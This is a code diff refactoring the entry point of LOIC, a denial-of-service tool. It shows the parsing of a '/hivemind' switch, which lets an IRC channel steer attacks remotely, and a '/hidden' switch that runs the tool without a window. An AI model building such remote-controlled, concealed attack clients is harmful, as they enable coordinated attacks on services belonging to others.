@@ -1,56 +1,71 @@
-﻿using System;
-using System.Windows.Forms;
-using System.Text;
-
-namespace LOIC
+﻿namespace LOIC
 {
+	#region using directives
+	using System;
+	using System.Text;
+	using System.Windows.Forms;
+	#endregion
+
 	static class Program
 	{
 		[STAThread]
-		static void Main(string[] cmdLine)
+		static void Main (string[] cmdLine)
 		{
 			bool hive = false;
 			bool hide = false;
-			/* IRC */
-			string ircserver = "";
-			string ircport = "";
-			string ircchannel = "";
-			/* Lets try this! */
+			
+			// IRC
+			string ircServerUri = string.Empty;
+			string ircPort = string.Empty;
+			string ircChannel = string.Empty;
+			
+			// Lets try this!
 			int count = 0;
-			foreach (string s in cmdLine)
-			{
-				/* IRC */
-				if (s.ToLower() == "/hivemind")
-				{
-					hive = true;
-					ircserver = cmdLine[count + 1]; //if no server entered let it crash
-					try {ircport = cmdLine[count + 2];}
-					catch (Exception) {ircport = "6667";} //default
-					try {ircchannel = cmdLine[count + 3];}
-					catch (Exception) {ircchannel = "#loic";} //default
+			foreach (string s in cmdLine) {
+				if (!string.IsNullOrEmpty (s) && s[0] == '/') {
+					string s2 = s.ToLower ();
+					if (s2 == "/hivemind") {
+						hive = true;
+						ircServerUri = cmdLine[count + 1];
+						//if no server entered let it crash
+						try {
+							ircPort = cmdLine[count + 2];
+						} catch (Exception) {
+							ircPort = "6667";
+						}
+						//default
+						try {
+							ircChannel = cmdLine[count + 3];
+						} catch (Exception) {
+							ircChannel = "#loic";
+						}
+						//default
+					} else if (s2 == "/hidden") {
+						hide = true;
+					}
 				}
-				/* Lets try this! */
-				if (s.ToLower() == "/hidden") {hide = true;}
+				
 				count++;
 			}
-			//Application.EnableVisualStyles();
-			Application.SetCompatibleTextRenderingDefault(false);
-			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel));
+			
+			Application.SetCompatibleTextRenderingDefault (false);
+			Application.Run (new frmMain (hive, hide, ircServerUri, ircPort, ircChannel));
 		}
 	}
-    public partial class Functions
-    {
-		public string RandomString()
-        {
-            StringBuilder builder = new StringBuilder();
-            Random random = new Random();
-            char ch;
-            for (int i = 0; i < 6; i++)
-            {
-                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
-                builder.Append(ch);
-            }
-            return builder.ToString();
+
+	public partial class Functions
+	{
+		public string RandomString ()
+		{
+			StringBuilder builder = new StringBuilder ();
+			Random random = new Random ();
+			char ch;
+			for (int i = 0; i < 6; i++) {
+				ch = (char)((int)(Math.Floor (26 * random.NextDouble () + 65)));
+				builder.Append (ch);
+			}
+			
+			return builder.ToString ();
 		}
 	}
 }
